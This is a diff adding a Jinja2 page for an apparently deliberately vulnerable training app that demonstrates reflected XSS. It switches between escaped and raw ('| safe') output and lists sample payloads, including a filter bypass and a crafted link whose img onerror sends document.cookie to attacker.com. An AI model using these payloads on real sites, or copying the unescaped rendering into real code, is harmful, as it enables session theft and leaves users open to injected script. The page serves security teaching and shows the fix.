@@ -1,0 +1,71 @@
+{% extends "base.html" %}
+{% block title %}XSS — Reflected{% endblock %}
+{% block content %}
+
+<h1 class="page-title">XSS — Reflected</h1>
+<p class="page-subtitle">A03:2021 · User input reflected in the response without HTML encoding</p>
+
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Output encoded with html.escape() — script tags rendered as text.
+  {% else %}Raw output — script tags execute in your browser.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>🔍</span><span class="card-title">Search</span></div>
+      <form method="GET" action="/xss/reflected">
+        <input name="safe" type="hidden" value="{{ '1' if safe else '0' }}">
+        <div style="display:flex;gap:0.75rem;">
+          <input name="q" class="form-input" placeholder="search..." value="{{ q | e }}">
+          <button type="submit" class="btn btn-green">Search</button>
+        </div>
+      </form>
+
+      {% if q %}
+      <div style="margin-top:1rem;padding:1rem;background:#010409;border:1px solid var(--border);border-radius:6px;">
+        <div style="font-size:11px;color:var(--gray);margin-bottom:0.5rem;">Results for:</div>
+        <div style="font-size:14px;">{% if safe %}{{ output }}{% else %}{{ output | safe }}{% endif %}</div>
+      </div>
+      {% endif %}
+
+      {% if not safe and q %}
+      <div class="alert alert-danger" style="margin-top:0.75rem;">⚠ If your input contained a script tag — it just executed in your browser.</div>
+      {% endif %}
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span>🔗</span><span class="card-title">Craft Phishing URL</span></div>
+      <div style="font-size:12px;color:var(--gray);margin-bottom:0.75rem;">An attacker would share this link. The victim clicks it, their browser runs the script:</div>
+      <div class="code-block" style="word-break:break-all;font-size:11px;">http://localhost:5000/xss/reflected?safe=0&q=<span style="color:var(--red);">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></div>
+      <div class="code-block" style="word-break:break-all;font-size:11px;">http://localhost:5000/xss/reflected?safe=0&q=<span style="color:var(--red);">&lt;img src=x onerror=fetch('//attacker.com?c='+document.cookie)&gt;</span></div>
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">Payloads to Try</span></div>
+      {% set payloads = [
+        ("<script>alert(1)</script>", "Basic alert — confirms XSS"),
+        ("<script>alert(document.cookie)</script>", "Shows cookies in alert box"),
+        ("<img src=x onerror=alert(1)>", "No script tag — fires via img error"),
+        ("<svg onload=alert(document.domain)>", "SVG-based XSS"),
+        ("<ScRiPt>alert(1)</ScRiPt>", "Mixed case — bypasses naive filters"),
+      ] %}
+      {% for payload, desc in payloads %}
+      <div style="background:#010409;border:1px solid var(--border);border-radius:5px;padding:0.6rem 0.8rem;margin-bottom:0.4rem;cursor:pointer;" onclick="document.querySelector('[name=q]').value='{{ payload | e }}'; document.querySelector('form').submit();">
+        <code style="font-size:11px;color:var(--red);">{{ payload | e }}</code>
+        <div style="font-size:10px;color:var(--gray);margin-top:3px;">{{ desc }}</div>
+      </div>
+      {% endfor %}
+
+      <div class="alert alert-info" style="margin-top:1rem;">
+        <strong>Fix:</strong> <code>html.escape(q)</code> before rendering. In Jinja2: use <code>{{ "{{ var }}" }}</code> (auto-escaped), never <code>{{ "{{ var | safe }}" }}</code> with user data.
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
